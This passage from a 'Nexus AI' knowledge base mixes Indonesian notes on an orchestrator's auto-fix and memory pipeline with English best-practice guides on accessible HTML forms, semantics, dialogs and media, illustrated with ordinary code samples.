2.  **Nexus-Embedded**: Mencari folder `nexus/` jika folder dokumentasi tidak ditemukan.
3.  **Root-Fallback**: Jika keduanya tidak ada, Engine akan beroperasi langsung di root folder namun memberikan peringatan untuk standarisasi.

---

## 📋 5. Implementation Planning & Auto-Fix
Engine tidak hanya menemukan masalah, tetapi juga merencanakan dan mengeksekusi solusi.

**Proses:**
1.  **Plan Generation**: Membuat file `PLAN-*.json` dan `.md` yang berisi daftar tugas terperinci.
2.  **Auto-Action Injection**: Tugas tertentu (seperti mengamankan `.env`) secara otomatis disuntikkan dengan aksi fisik (`FILE_APPEND`, `FILE_REPLACE`).
3.  **Atomic Execution**: Menggunakan `Modifier.js` untuk menerapkan perubahan langsung ke file proyek eksternal setelah lolos verifikasi TDD.

---

## 🧐 Analisis Integrasi Eksternal

### Kekuatan Saat Ini:
-   **Zero-Config Detection**: Engine sangat fleksibel dalam mengenali struktur folder proyek yang berbeda.
-   **Real-time Development**: Berkat `npm link`, setiap pembaruan logika di Engine pusat langsung tersedia di seluruh proyek yang terhubung.
-   **Compliance-First**: TDD Guard memastikan pengembang (dan AI) tidak melakukan perubahan sembarangan.

### Rekomendasi (External Roadmap):
1.  **Remote Harvesting**: Mengembangkan kemampuan untuk memanen pengetahuan dari repository remote tanpa harus melakukan cloning lokal.
2.  **External Skill Injection**: Memungkinkan proyek eksternal memiliki "Custom Skills" yang hanya berlaku untuk proyek tersebut namun tetap dikelola oleh Orchestrator pusat.

---
## 🚀 6. External Pipeline Roadmap (Future Optimizations)
Kelima pilar optimasi saat ini berada dalam fase perencanaan:
1.  **TDD Scaffolding**: [Planning] Otomatisasi pembuatan test.
2.  **Lainnya**: Skill Injection, Atomic Rollback, Knowledge Distillation, & Shadow Audit.
Detail lengkap di [EXTERNAL_PIPELINE_ROADMAP.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/documentation/planning/EXTERNAL_PIPELINE_ROADMAP.md).

---
*Generated by Nexus AI | Status: TDD_LAB_FOCUS | Date: 2026-05-01*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_FORMS.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## 1. Semantic Structure and Form Element

### Guidelines

- **DO** use the `<form>` element to wrap interactive controls for data collection.
- **DO** use `method="POST"` for sensitive data and mutations; use `method="GET"` for idempotent requests (e.g., search).
- **DO** specify the `action` attribute for the destination URL.
- **DO** specify a `name` attribute for every form control to identify data on submission.
- **DO** use semantic tags like `<button type="submit">`, `<textarea>`, and `<select>`.
- **DO** use `<fieldset>` and `<legend>` to group related controls.
- **DO** use actionable language on submit buttons (e.g., "Save changes").

- **DON'T** use `GET` for sensitive data (it exposes data in history/logs).
- **DON'T** use generic `<div>` or `<span>` for form controls.
- **DON'T** use `type="button"` for primary submission buttons.
- **DON'T** disable textarea resizing without alternate layout provisions.

### Code Example

```html
<form action="/search" method="GET">
  <fieldset>
    <legend>Search Preferences</legend>
    <label for="q">Query:</label>
    <input type="text" id="q" name="q" required>
    <button type="submit">Search</button>
  </fieldset>
</form>
```

### Selection Control Decision Matrix

| Options Count | Choice Type | Recommended Element | Usability & Accessibility Logic |
| :--- | :--- | :--- | :--- |
| **1–5** | Single (Exclusive) | `<input type="radio">` | **Zero-click scanning**: All choices are immediately visible. Faster scan time. |
| **6+** | Single (Exclusive) | `<select>` | **Space conservation**: Use only when vertical space is premium or the list is long. |
| **10+ / Dynamic** | Single (Exclusive) | `<input list="id">` (`<datalist>`) | **Fuzzy Search**: Prevents scrolling fatigue in massive sets (e.g., countries). |
| **Any** | Multi-select | `<input type="checkbox">` | **Standard semantics**: Native non-exclusive toggles. |

**Single-Sentence Mental Model**: "Expose mutually exclusive options as visible radio buttons when choices are fewer than six; use `<select>` only when space is constrained or the list is long."

## 2. Accessible Labeling and State

### Guidelines

- **DO** always associate `<label>` with its input using `for` and `id`.
- **DO** place labels above form controls to enable faster scanning.
- **DO** use visible labels; do not rely on `placeholder` alone.
- **DO** ensure the vertical margin between a label and its input is less than the margin between form groups (**Gestalt Proximity Rule**).
- **DO** use `aria-describedby` to link inputs with help text or error messages.
- **DO** define the `lang` attribute on `<html>` for proper device translation.
- **DO** use non-color visual cues (icons, text) to communicate state (don't rely on color alone).
- **DO** indicate clearly which fields are required.
- **DO** use `aria-live` for dynamic error announcements.

- **DON'T** use `placeholder` as a replacement for labels.
- **DON'T** use `aria-label` as the sole text description if translation is needed.
- **DON'T** disable focus outlines without providing a high-contrast alternative.

### Code Example

```html
<div class="field">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username" aria-describedby="user-help" required>
  <span id="user-help" class="hint">3-12 characters.</span>
</div>

<style>
  input:focus-visible {
    outline: 3px solid #0b57d0;
    outline-offset: 2px;
  }
</style>
```

## 3. Autofill and Input Modes

### Guidelines

- **DO** use the `autocomplete` attribute to specify expected data (e.g., `email`, `tel`, `current-password`, `new-password`).
- **DO** use `inputmode` to optimize on-screen keyboards (e.g., `inputmode="numeric"` for PINs).
- **DO** use `enterkeyhint` to set the Enter key label (e.g., `next`, `done`).
- **DO** use single-field inputs for complex numbers (credit cards, phones) to help autofill.

- **DON'T** use `type="number"` for credit cards or ZIP codes (causes UI scroll issues and removes leading zeros).

### Code Example

```html
<label for="zip">ZIP Code:</label>
<input type="text" id="zip" name="zip" autocomplete="postal-code" inputmode="numeric" pattern="\d{5}">
```

## 4. Constraints and Validation

### Guidelines

- **DO** use native constraints: `required`, `minlength`, `maxlength`, `pattern`.
- **DO** use CSS pseudo-classes `:invalid:user-invalid` for non-intrusive styling.
- **DO** use the ValidityState API (`setCustomValidity`) for custom messaging.

- **DON'T** disable submit buttons to block validation; let users submit and highlight errors. However, **DO** disable the button *after* a valid submission is clicked to prevent double-posts.

### Code Example

```html
<label for="code">Activation Code (4 digits):</label>
<input type="text" id="code" name="code" required pattern="\d{4}">

<script>
  const input = document.getElementById('code');
  input.addEventListener('invalid', () => {
    input.setCustomValidity('Please enter exactly 4 digits.');
  });
  input.addEventListener('input', () => {
    input.setCustomValidity('');
  });
</script>
```

### Validation Event Timing Matrix

| Event Trigger | Phase | Action Allowed | UX / Accessibility Logic |
| :--- | :--- | :--- | :--- |
| **`input`** | Active Typing | **Clear** existing errors only. | **Non-intrusive**: Do not yell at the user before they finish typing. |
| **`blur` / `focusout`** | Exiting Field | **Run** check and show error. | **Contextual validation**: Validate once the user indicates they are "done" with a field. |
| **`submit`** | Final Attempt | **Block** and route focus. | **Final gatekeeper**: Intercepts bad payloads and forces screen reader focus to the summary. |

**Single-Sentence Mental Model**: "Validate on `blur` to avoid premature warnings while typing, and reset error states on `input` as soon as the user attempts a correction."

**Security vs UX Scale**: Client-side validation is for User Experience; Server-side validation is for Security. Never treat browser constraints as a data integrity defense.

## 5. Responsive Design and Typography

### Guidelines

- **DO** use single-column layouts for scanning.
- **DO** set `font-size` to at least `1rem` (16px) to prevent iOS zoom.
- **DO** expand clickable areas for mobile tap targets using padding tricks.
- **DO** ensure tap targets are at least `48px`.
- **DO** use units relative to root (`rem`) and unitless `line-height`.
- **DO** use CSS logical properties (e.g., `margin-inline-start`) for RTL support.

### Code Example

```css
.form-group {
  margin-block-end: 1.5rem;
}

/* Expand clickable tap area without layout shift */
label {
  display: inline-block;
  padding: 10px 0;
  margin: -10px 0;
}

input {
  font-size: 1rem;
  padding: 0.75rem;
  min-height: 48px;
  box-sizing: border-box;
}

@media (pointer: coarse) {
  input {
    min-height: 52px;
  }
}
```

## 6. Styling Form Controls

### Guidelines

- **DO** use `accent-color` for quick branding of native radios/checkboxes.
- **DO** use `appearance: none` for custom dropdown arrows without breaking semantics.
- **DO** ensure inputs are clearly visible with adequate border contrast (e.g., `#ccc` or darker on white backgrounds).
- **DO** hide inputs visually using the canonical `.visually-hidden` recipe (`clip-path: inset(50%)` with 1px dimensions) — NOT `display: none`, which removes them from the accessibility tree.

### Code Example

```html
<div class="checkbox-container">
  <input type="checkbox" id="sub" name="sub" class="visually-hidden">
  <label for="sub" class="checkbox-label">Subscribe</label>
</div>

<style>
  .visually-hidden {
    position: absolute;
    clip-path: inset(50%);
    overflow: hidden;
    width: 1px;
    height: 1px;
    margin: -1px;
    padding: 0;
    border: 0;
    white-space: nowrap;
  }
  .checkbox-label::before {
    content: "";
    display: inline-block;
    width: 1.25rem;
    height: 1.25rem;
    border: 2px solid #ccc;
  }
  input:focus-visible + .checkbox-label::before {
    outline: 2px solid #0b57d0;
  }
</style>
```

## 7. JavaScript and AJAX

### Guidelines

- **DO** prevent default navigation on form submit for AJAX (`e.preventDefault()`).
- **DO** use `ValidityState` interfaces for real-time validation checks.
- **DO** use `aria-expanded` and `aria-controls` for dynamic UI reveals.

- **DON'T** block page submission if JS fails; ensure server-side fallback.

### Code Example

```js
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const data = new FormData(form);
  // fetch('/submit', { method: 'POST', body: data });
});
```

## 8. Identity, Payments, and Advanced Security

### Guidelines

- **DO** use `autocomplete="new-password"` for sign-up and `autocomplete="current-password"` for sign-in.
- **DO** allow pasting into password fields.
- **DO** provide a toggle capability allowing users to unmask password input.
- **DO** indicate exact amounts on pay buttons (e.g., "Pay $100").
- **DO** use `autocomplete="cc-number"`, `cc-exp`, `cc-csc`.
- **DO** use HTTPS for all pages.
- **DO** implement cryptographically secure anti-CSRF tokens for mutating actions (POST/PUT/DELETE).
- **DO** sanitize user input (e.g., via DOMPurify) before injecting it into the DOM to prevent XSS.
- **DO** implement spam protection (honeypots or CAPTCHA) for open forms.

- **DON'T** utilize HTTP `GET` for endpoints executing state changes.
- **DON'T** use inline JavaScript (e.g., `onclick="..."`) directly within form markup to satisfy strict Content Security Policies (CSP).

### Code Example

```html
<form method="post">
  <input type="hidden" name="csrf_token" value="secure_token_abc123">

  <h1>Sign up</h1>

  <div class="form-group">        
    <label for="name">Full name</label>
    <input id="name" name="name" autocomplete="name" required pattern="[\p{L}\.\- ]+">
  </div>

  <div class="form-group">        
    <label for="email">Email</label>
    <input id="email" name="email" type="email" autocomplete="username" required>
  </div>

  <div class="form-group">
    <label for="password">Password</label>
    <button id="toggle-password" type="button" aria-pressed="false" aria-label="Show password" aria-describedby="toggle-warning">
      <img class="icon-eye" src="/icons/eye.svg" alt="" width="20" height="20">
      <img class="icon-eye-off" src="/icons/eye-off.svg" alt="" width="20" height="20">
    </button>
    <span id="toggle-warning" class="visually-hidden">Warning: this will display your password on the screen.</span>
    <input id="password" name="password" type="password" autocomplete="new-password" minlength="8" aria-describedby="password-constraints" required>
    <div id="password-constraints">Eight or more characters.</div>
  </div>

  <button id="sign-up">Sign up</button>
</form>
```


## 9. Address Collection

### Guidelines

- **DO** use a single field for names.
- **DO** use `autocomplete="street-address"`.
- If the site has users in different countries, **DO** use the `<textarea>` element for addresses, to accommodate different address formats in different geographical regions. If the form uses separate inputs for address parts (e.g. Street, City), **DO** use `autocomplete` values `address-line1`, `address-line2`, etc.
- **DO** make postal codes optional.

- **DON'T** split name inputs into rigid variables ("First", "Last") for global audiences.
- **DON'T** enforce Latin-only characters for names and usernames.

### Code Example

```html
<!-- Accessible Address Form with Autofill -->
<form action="/save-address" method="POST">
  <div class="form-group">
    <label for="full-name">Full name</label>
    <input type="text" id="full-name" name="full_name" maxlength="100" required autocomplete="name">
  </div>

  <div class="form-group">
    <label for="address">Address</label>
    <textarea id="address" name="address" required autocomplete="street-address" maxlength="300"></textarea>
  </div>

  <button type="submit">Save Address</button>
</form>
```


## 10. Usability Testing and Analytics

### Guidelines

- **DO** test forms across multiple devices, browsers, and screen sizes.
- **DO** test keyboard-only navigation (using `Tab` and `Shift+Tab`) and verify visual focus.
- **DO** emulate various impairments (visual, motor) using browser tools.
- **DO** use analytics to monitor form completion rates and bounce points.
- **DO** track discrete events (e.g., field focus, click) to find micro-friction points.

- **DON'T** rely solely on automated tools (Lighthouse) for usability; test with real users.
- **DON'T** track sensitive personal data in standard event labels.

### Code Example

```html
<form action="/submit" method="POST" id="track-form">
  <label for="postal-code">ZIP or postal code</label>
  <input type="text" id="postal-code" name="postal-code" autocomplete="postal-code" maxlength="20" required>
  <button type="submit" id="submit-btn">Submit</button>
</form>

<script>
  const trackForm = document.getElementById('track-form');
  const trackBtn = document.getElementById('submit-btn');
  
  trackBtn.addEventListener('click', () => {
    console.log('Analytics Event: Submit clicked');
  });
</script>
```

## 11. Multi-Page Forms

### Guidelines

- **DO** clearly display progress through a multi-page form with clear labels and progress indicators.
- **DO** allow users to navigate backwards and forwards between pages.
- **DO** use context-specific `enterkeyhint` values (e.g., `"previous"`, `"next"`) to guide navigation via on-screen keyboards.
- **DO** design layouts so that the mobile keyboard does not obscure inputs or buttons (e.g., by placing them in the upper half of the viewport when focused or using CSS scroll-padding).

### Code Example

```html
<nav aria-label="Progress">
  <ol class="progress-tracker">
    <li class="step-done">Step 1: Account</li>
    <li class="step-active" aria-current="step">Step 2: Shipping</li>
    <li class="step-todo">Step 3: Payment</li>
  </ol>
</nav>

<button type="button" onclick="history.back()" enterkeyhint="previous">Previous</button>
<button type="submit" enterkeyhint="next">Next</button>
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_HTML.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## Table of Contents

1. Fundamental Semantics and Validation
2. Content Grouping and Attribution
3. Resource Prioritization and Performance
4. Native Overlays: Dialogs and Popovers
5. Disclosures: Details and Summary
6. Focus Boundaries and Visibility
7. HTML APIs and Forms Grouping
8. Native Media Elements
9. Dynamic Styles and Interactivity

## 1. Fundamental Semantics and Validation

### Guidelines

- **DO** use the standard HTML5 doctype `<!DOCTYPE html>` to prevent quirky rendering modes. 
- **DO** set the `lang` attribute on the `<html>` element for screen reader pronunciation and translation tools.
- **DO** use the `<meta name="viewport">` element with the `content` attribute set to `"width=device-width, initial-scale=1.0"` to ensure page responsiveness.
- **DO** use a single `<h1>` per page/view representing the main topic. Exceptions can be made for modal dialogs, which can also use a single `<h1>`.
- **DO** maintain a sequential, non-skipping heading hierarchy (`<h2>` to `<h3>`, but not `<h2>` to `<h4>`).
- **DO** use semantic landmarks (`<header>`, `<nav>`, `<main>`, `<aside>`, `<footer>`) to create regional navigation for assistive technologies.
- **DO** use `<search>` to enclose search and filtering mechanisms (eliminates the need for `role="search"`).
- **DO** use `<button>` for triggered actions (JS, Modals, Forms) and `<a>` strictly for URL navigation. Set `type="button"` for non-submit buttons in forms to prevent unintended submission.
- **DO** use `<ul>`, `<ol>`, and `<dl>` elements for list content. 
- **DO** ensure that all interactive elements like links and buttons have accessible names.  
- **DO** hide purely decorative SVG images from assistive technology using `aria-hidden="true"`. If using a decorative `<img>`, always include an empty `alt` attribute (e.g. `alt=""`). 
- **DO** ensure that informative SVGs like logos, data visualizations, or icon buttons have a proper accessible name. 

- **DON'T** use generic `<div>` or `<span>` when semantic elements exist, for instance for interactive elements, headings, or independently reusable self-contained content.
- **DON'T** use boolean attributes with redundant values (e.g., use `disabled`, not `disabled="disabled"`).
- **DON'T** use generic elements with added ARIA roles or states when native elements with built-in semantics and behavior exist.
- **DON'T** change the native semantics of elements with ARIA unless it is a critical requirement. 
- **DON'T** use `role="presentation"` or `aria-hidden="true"` on focusable elements or their parents and ancestors. 
- **DON'T** disable page zooming capabilities.

### Code Example

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard | Platform</title>
</head>
<body>
  <header>
    <nav>
      <ul>
        <li><a href="#">About</a></li>
        <li><a href="#">Contact</a></li>
      </ul>
    </nav>
  </header>
  <main>
     <h1>Analytics</h1>
    <search>
      <form action="/filter" method="GET">
        <label for="search-input">Scan items:</label>
        <input type="search" id="search-input" name="q">
        <button type="submit">Search</button>
      </form>
    </search>
    <article>
      <h2>First post</h2>
    </article>
  </main>
</body>
</html>
```

## 2. Content Grouping and Attribution

### Guidelines

- **DO** use `<blockquote>` for extended quotations from another source, and use the `cite` attribute to provide a machine-readable URL for that source.
- **DO** use `<figure>` to group self-contained content (images, code snippets, or quotes) that is referenced from the main flow but could be moved to an appendix or sidebar without affecting the document's meaning.
- **DO** use `<figcaption>` as the first or last child of a `<figure>` to provide a human-readable caption or attribution.
- **DO** use the `<cite>` element inside a caption or attribution to identify the **title** of a work (e.g., a book or website name), not the author's name.
- **DO** use the `<code>` element for short fragments of computer code (e.g., variable names, file paths, or inline snippets).
- **DO** wrap `<code>` inside a `<pre>` element when displaying blocks of code to preserve whitespace and line breaks.
- **DO** ensure that code blocks are accessible by adding `tabindex="0"` to the `<pre>` element if it becomes scrollable, allowing keyboard users to reach the content.

- **DON'T** use `<blockquote>` for purely visual indentation of non-quoted text.
- **DON'T** use `<figure>` for every single image; use it only when a caption is required or when the content is a distinct, referenced unit.
- **DON'T** use `<pre>` without `<code>` for code blocks; `<pre>` alone only preserves formatting but doesn't convey that the content is a computer language.

### Code Example

```html
<!-- Quote with attribution using Figure -->
<figure>
  <blockquote cite="https://html.spec.whatwg.org/">
    <p>The figure element represents some flow content, optionally with a caption, that is self-contained and is typically referenced as a single unit from the main flow of the document.</p>
  </blockquote>
  <figcaption>
    Definition of the &lt;figure&gt; element from the <cite>HTML Living Standard</cite>
  </figcaption>
</figure>

<!-- Image with caption -->
<figure>
  <img 
    src="architecture-diagram.webp" 
    alt="Diagram showing the flow between Client, API Gateway, and Microservices"
    width="800"
    height="450"
    loading="lazy"
  >
  <figcaption>Figure 1: High-level system architecture overview.</figcaption>
</figure>

<!-- Code block with accessibility and language hint -->
<figure>
  <figcaption>Example configuration:</figcaption>
  <pre tabindex="0"><code class="language-json">
{
  "name": "gemini-cli",
  "version": "1.0.0",
  "private": true
}
  </code></pre>
</figure>

<!-- Inline code -->
<p>To initialize the project, run the <code>npm install</code> command.</p>
```

## 3. Resource Prioritization and Performance

### Guidelines

- **DO** use `fetchpriority="high"` for the Largest Contentful Paint (LCP) element (e.g., hero image) to elevate network priority.
- **DO** use `<link rel="preload" as="image">` with `fetchpriority="high"` for LCP background images defined in CSS.
- **DO** apply `loading="lazy"` to off-screen images and iframes to defer bandwidth.
- **DO** specify `width` and `height` on all `<img>` tags to preserve aspect ratio and prevent Layout Shifts (CLS).
- **DO** use the `srcset` attribute on `<img>`s for adding multiple versions of the same image at different sizes.
- **DO** use the `<picture>` element with a fallback `<img>` for more fine-grained image control like switching between image formats, image sizes, and cropping images at different device sizes. 

- **DON'T** apply `loading="lazy"` to above-the-fold or hero images. This delays LCP.
- **DON'T** overuse `fetchpriority="high"`; prioritization is a zero-sum mechanism. Use `fetchpriority="low"` to demote non-critical trackers or carousel items.

### Code Example

```html
<!-- High-priority hero image with responsive sizes -->
<img 
  src="hero-large.webp" 
  srcset="hero-small.webp 480w, hero-medium.webp 800w, hero-large.webp 1200w"
  sizes="(max-width: 600px) 100vw, (max-width: 1200px) 80vw, 70vw"
  alt="Main product view" 
  fetchpriority="high" 
  width="1200" 
  height="600"
>

<!-- Art direction and format switching with <picture> -->
<picture>
  <!-- Mobile Art Direction: Different aspect ratio (square) and format (AVIF) -->
  <source 
    media="(max-width: 600px)" 
    srcset="hero-mobile.avif 1x, hero-mobile-2x.avif 2x" 
    type="image/avif"
    width="600" 
    height="600"
  >
  <source 
    media="(max-width: 600px)" 
    srcset="hero-mobile.webp 1x, hero-mobile-2x.webp 2x"
    width="600" 
    height="600"
  >
  
  <!-- Desktop: Modern format for primary layout -->
  <source srcset="hero-desktop.avif" type="image/avif">

  <!-- Fallback img defines the default aspect ratio (2:1) -->
  <img 
    src="hero-desktop.webp" 
    alt="Platform dashboard overview" 
    width="1200" 
    height="600"
    loading="lazy"
  >
</picture>

<!-- Low-priority decorative footer image -->
<img 
  src="footer-art.png" 
  alt="" 
  loading="lazy" 
  width="200" 
  height="100"
>
```

## 4. Native Overlays: Dialogs and Popovers

### Guidelines

See `declarative-dialog-popover-control` (via `npx -y modern-web-guidance@latest retrieve "declarative-dialog-popover-control"`) for more info on fallback strategies for using the Popover API in a cross-browser way.
- **DO** use `<dialog>` for modal overlays (requires JS `.showModal()`) to automatically trap focus, dim backgrounds, and support dismissing via `Esc`. Use the `closedby="any"` attribute to enable native "light-dismiss" (closing on backdrop click) without custom JavaScript.
- **DO** utilize the Popover API (`popover` attribute) for non-modal UI (menus, tooltips) that do not require focus traps.
- **DO** use `::backdrop` to style modal backgrounds.
- **DO** use `<form method="dialog">` to dismiss dialogs without manual JS handlers. Combined button `formmethod="dialog"` yields the button's value to the dialog `.returnValue`.

- **DON'T** use `show()` for modals where keyboard traps are expected (use `showModal()`).
- **DON'T** call `showModal()` on elements possessing a `popover` attribute (they are mutually exclusive programmatic states). However, `<dialog popover="auto">` is a valid declarative architecture to combine dialog semantics with light-dismiss mechanics.

### Code Example

```html
<!-- Popover (No JS required for toggle) -->
<button popovertarget="help-menu">Info</button>
<div id="help-menu" popover="auto">
  <p>Standard help text.</p>
</div>

<!-- Modal Dialog with Form-based closing -->
<button id="show-dialog">Open dialog</button>
<dialog id="fav-modal">
  <!-- method="dialog" closes the dialog natively and sets the returnValue -->
  <form method="dialog">
    <p>Confirm action?</p>
    <button value="cancel">Cancel</button>
    <button value="confirm">Confirm</button>
  </form>
</dialog>

<script>
  const dialog = document.getElementById("fav-modal");
  const openModal = document.getElementById("show-dialog");
  
  // Show modal dialog
  openModal.addEventListener('click', () => dialog.showModal());
  
  // Listen for the 'close' event to retrieve the user's choice (returnValue)
  dialog.addEventListener('close', () => {
    console.log(dialog.returnValue); // "confirm" or "cancel"
  });
</script>
```

### Native UI Overlay & Disclosure Matrix

| Feature | Modality | Focus | Dismiss Mechanism | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`<dialog>`** | Modal / Non-modal | Automatic trap (Modal) | Esc / Form / `closedby` | Critical Actions, Settings |
| **`[popover]`** | Non-modal | Standard Tab flow | Light-dismiss (Click outside) | Menus, Tooltips, Toasts |
| **`<details>`** | Inline Disclosure | Standard Tab flow | Toggle summary | Accordions, FAQs |

**Heuristic Rule**: Use `<dialog>` for interruptions requiring user action, `popover` for transient info, and `<details>` for inline content expansion.

## 5. Disclosures: Details and Summary

### Guidelines

- **DO** use `<details>` and `<summary>` for native accordions or revealable content without JS.
- **DO** place `<summary>` as the *first* child of `<details>`.
- If headings must be used within a `<summary>`, consider if the heading is essential for understanding or navigating the document structure. If it is, use a more robust disclosure approach that allows wrapping the disclosure trigger with the heading (e.g. `<h2><button type="button" aria-expanded="false" aria-controls="significant-section-content">Significant section</button></h2>`). This ensures the heading semantics aren’t lost, and the button and its state are announced.
- **DO** use `details[open]` attribute for styling expanded states.
- **DO** use `details::details-content` for styling the contents of the `<details>` element.
- **DO** use the `name` attribute on multiple `<details>` elements to create exclusive accordions (opening one closes others).

- **DON'T** nest other interactive elements (links, buttons) directly inside `<summary>` text as it acts as a button and breaks focus.
- **DON'T** hide visible triangles via `list-style: none` without providing explicit directional cues (via `::before`/`::after` pseudo-elements).
- **DON'T** use the `title` attribute to create tooltip effects. 

### Code Example

```html
<!-- Exclusive Accordion Set -->
<details name="faq">
  <summary>Item 1</summary>
  <p>Contents...</p>
</details>
<details name="faq">
  <summary>Item 2</summary>
  <p>Contents...</p>
</details>
```

## 6. Focus Boundaries and Visibility

### Guidelines

- **DO** use the global `inert` attribute for entire hidden sections (off-screen menus, background while custom modal is open) to remove them from tab flows and accessibility trees.
- **DO** pair `[inert]` with CSS (`opacity: 0.5`) to visually signify inactivity.
- **DO** rely on natural DOM order for sequential navigation. 

- **DON'T** use positive `tabindex` values (e.g., `1`, `2`). Use `0` to add element to tab flow, or `-1` for JS program focus.
- **DON'T** alter focus flow using CSS properties (`flex-flow: row-reverse`, `order`) without aligning the DOM structure.
- **DON'T** use `node.focus({ preventScroll: true })` without usability validation; it can hide the focused element off-screen.

### Code Example

```html
<!-- De-tabbing a background app shell while custom drawer is open -->
<main id="app-shell" inert>
  <a href="/">Dashboard</a>
</main>
<aside id="drawer">
  <button>Close</button>
</aside>
```

```css
[inert], [inert] * {
  opacity: 0.5;
  cursor: default;
  user-select: none;
}
```

## 7. HTML APIs and Forms Grouping

### Guidelines

See `forms` (via `npx -y modern-web-guidance@latest retrieve "forms"`) for more details on creating modern web forms.

- **DO** utilize the `form="form-id"` attribute to decouple inputs from the physical `<form>` tree.
- **DO** use `<datalist>` coupled with `<input list="id">` for lightweight auto-suggestions (note: visually unstylable and has screen-reader quirks). 
- **DON'T** use `autocomplete="off"` on credential, address, payment, or contact fields. Browsers and password managers ignore it there by design. Use a specific token instead (`autocomplete="email"`, `"street-address"`, `"cc-number"`, etc.).
- **DON'T** use `autocomplete="off"` unless handling highly sensitive tracking tokens (violates standard password manager overrides). Use standard inputs `type="email"`, `type="tel"`.
- **DO** distinguish `autocomplete="current-password"` (sign-in) from `autocomplete="new-password"` (registration / password change) so password managers offer the right action.                                                    
- **DO** match `autocomplete` tokens with appropriate `inputmode` and `type` (`type="email"` + `inputmode="email"` + `autocomplete="email"`). They control different things — keyboard, validation, and autofill respectively — and reinforce each other.

### Code Example

```html
<form>
  <fieldset>
    <legend>Address Information</legend>
    <label for="city">City:</label>
    <input type="text" id="city" list="cities" autocomplete="address-level2">
    <datalist id="cities">
      <option value="New York">
      <option value="London">
    </datalist>
  </fieldset>
</form>
```

## 8. Native Media Elements

### Guidelines

- **DO** set `width` and `height` to prevent layout shifts (CLS) on `<video>` elements.
- **DO** provide a `poster` image fallback for videos.
- **DO** include subtitles and captions with `<track>`.
- **DO** ensure background videos are `muted`, provide users with full control over playback, and use `role="none"` or `aria-hidden="true"`. The `controls` attribute must also be omitted to make sure the video is not focusable.  

- **DON'T** rely on JS for basic video controls if native `controls` attribute is sufficient.
- **DON'T** apply `role="none"` or `aria-hidden="true"` to focusable elements (such as embedded interactive `<iframe>` components). Hiding elements from the assistive technology tree while leaving them accessible to sequential keyboard navigation violates core accessibility heuristics. The background video exception holds solely because omitting the `controls` attribute renders the `<video>` element fully non-focusable.

### Code Example

```html
<video 
  controls 
  width="800" 
  height="450" 
  poster="poster.webp"
>
  <source src="intro.webm" type="video/webm">
  <source src="intro.mp4" type="video/mp4">
  <track src="caps.vtt" kind="captions" srclang="en" label="English">
</video>
```

## 9. Dynamic Styles and Interactivity

### Guidelines
- **DO** use the `style` attribute to pass state to CSS via **Custom Properties**. This keeps visual logic in your stylesheet while JavaScript provides the raw data.

- **DON'T** use inline styles for static design (colors, padding, margins) that belong in a stylesheet.
- **DON'T** use inline event handlers (e.g., `onclick`). Trigger actions using `addEventListener()`.

### Code Example

```html
<body>
  <!-- Progress with style-driven color data -->
  <label for="upload-progress">Upload status:</label>
  <progress id="upload-progress" class="loading-bar" value="0" max="100" style="--brand-hue: 200;"></progress>

  <script>
    const updateProgress = (percent, hue) => {
      const bar = document.querySelector('.loading-bar');
      bar.value = percent;
      
      // Update dynamic style variable 
      if (hue) bar.style.setProperty('--brand-hue', hue);
    };

    // Example: Move to 85% and shift color to green (120)
    setTimeout(() => updateProgress(85, 120), 1000);
  </script>
</body>
```
```css
.loading-bar {
  accent-color: hsl(var(--brand-hue, 200) 80% 50%);
  transition: accent-color 0.3s ease;
}
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, api]

### 📘 KNOWLEDGE: NEXUS_INTERNAL_PIPELINE_RECAP.MD

# 🏗️ Rekapitulasi Pipeline Internal Nexus AI (Orchestrator)
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Dokumen ini menjelaskan alur kerja internal dari folder `agent/core/` untuk memberikan pemahaman menyeluruh tentang bagaimana Nexus AI mengelola data, memori, dan eksekusi.

---

## 🚀 1. NexusEngine: Sang Konduktor Utama (Autonomous Edition)

`NexusEngine.js` adalah pusat kendali yang kini beroperasi dengan tingkat otonomi tinggi.

**Alur Kerja Utama:**

1.  **INIT**: Inisialisasi jalur secara dinamis dengan dukungan penuh terhadap struktur `memory/long_term` & `memory/short_term`.
2.  **PARALLEL AUDIT**: Menjalankan auditor spesialis secara paralel (`Promise.all`), memangkas waktu pemindaian secara drastis.
3.  **SEMANTIC SEARCH**: Mencari pengetahuan di HUB menggunakan metadata/tags untuk akurasi yang lebih tinggi.
4.  **PLAN**: Mengubah temuan audit menjadi tugas (tasks) yang terukur.
5.  **AUTONOMOUS EXECUTE**: Menjalankan perubahan fisik dengan **TDD Scaffolding** otomatis (jika test belum ada) dan **Self-Healing Logs**.
6.  **VERIFY**: Validasi deterministik terhadap setiap tindakan yang telah dieksekusi.
7.  **RECORD**: Pengarsipan sesi dan sinkronisasi log pemulihan mandiri ke dokumen RECAP.

---

## 🧪 2. Distiller: Sang Editor HUB (Intelligent Edition)

`Distiller.js` kini berfungsi sebagai mesin intelijen yang mengelola keterkaitan antar pengetahuan.

**Fungsi:**

- **Advanced Extraction**: Mengekstraksi bagian *Insights* dan *Recommendations* secara cerdas dari dokumen mentah.
- **Semantic Tagging**: Menambahkan metadata domain (Security, UI-UX, TDD, dll) secara otomatis ke setiap file HUB.
- **Semantic Cross-Linking**: Menciptakan tautan (link) otomatis antar dokumen yang memiliki keterkaitan konsep teknis.
- **Standardization**: Menyeragamkan seluruh nama file di HUB dengan pola `NEXUS_...` menggunakan protokol **Multi-Option Merge**.

---

## 🧠 3. MemoryPipeline: Sang Pengumpul Harvest

`MemoryPipeline.js` kini berfokus pada penarikan data dari dunia luar (proyek-proyek audit).

**Fungsi:**

- **Harvest Ingestion**: Mengambil data pengetahuan dari folder `golden/harvest/` dan memasukkannya ke dalam HUB (`memory/long_term/`).
